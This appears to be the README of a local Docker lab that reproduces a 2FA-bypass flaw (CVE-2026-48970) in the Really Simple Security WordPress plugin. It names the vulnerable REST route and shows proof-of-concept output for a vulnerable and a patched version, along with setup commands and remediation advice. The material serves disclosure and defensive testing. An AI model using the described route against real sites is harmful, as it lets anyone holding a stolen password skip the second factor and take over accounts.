# RSSSL 2FA bypass lab (CVE-2026-48970)

Local reproducer for **Really Simple Security <= 9.5.10** pre-auth 2FA disable.

Affected route: `POST /?rest_route=/really-simple-security/v1/two-fa/v2/do_not_ask_again`
Fixed in: **9.5.11** (`has_configured_provider()` guard in `class-rsssl-base-controller.php`).

## Claim

Given a valid password for a user with 2FA enabled, the pre-auth `do_not_ask_again`
route accepts the post-password `login_nonce`, disables 2FA for that user, and issues
auth cookies. Second factor becomes optional against credential reuse.

Precondition: valid password. This is **not** auth bypass without credentials.

## Verified

Vulnerable — 9.5.6:

```
[+] login_nonce: dc8ba8ed...
[*] do_not_ask_again -> 200 {"redirect_to":"http://localhost:8089/wp-admin/"}
[*] wp-admin -> 200 <title>Dashboard &lsaquo; Lab &#8212; WordPress
[!] VULNERABLE: 2FA bypassed with password only
```

Patched — 9.5.11:

```
[+] login_nonce: 0d520833...
[*] do_not_ask_again -> 403 {"error":"Two-Factor Authentication must be completed before it can be disabled."}
[*] wp-admin -> 302
[+] blocked: 2FA required before it can be disabled
```

## Run

```
docker compose up -d
docker compose exec -T cli wp core install --url=http://localhost:8089 \
  --title=Lab --admin_user=admin --admin_password='Admin123!' \
  --admin_email=admin@example.test --skip-email
docker compose exec -T cli wp plugin install /plugins/really-simple-ssl.9.5.6.zip --activate
docker compose exec -T cli wp eval '
  rsssl_update_option("login_protection_enabled", true);
  rsssl_update_option("two_fa_enabled_roles_email", ["administrator"]);
  update_user_meta(1, "rsssl_two_fa_status_email", "active");
  update_user_meta(1, "rsssl_two_fa_email_enabled", 1);'
./poc_rsssl_2fa_bypass.sh     # exit 0 = vulnerable, exit 2 = patched
```

Plugin zips are downloaded by `fetch-plugins.sh`, not committed.

## Scope

Local Docker only. Nothing in this repo targets a third-party host.

## Remediation

Update Really Simple Security to 9.8.1+, verify 2FA enforcement after the update.
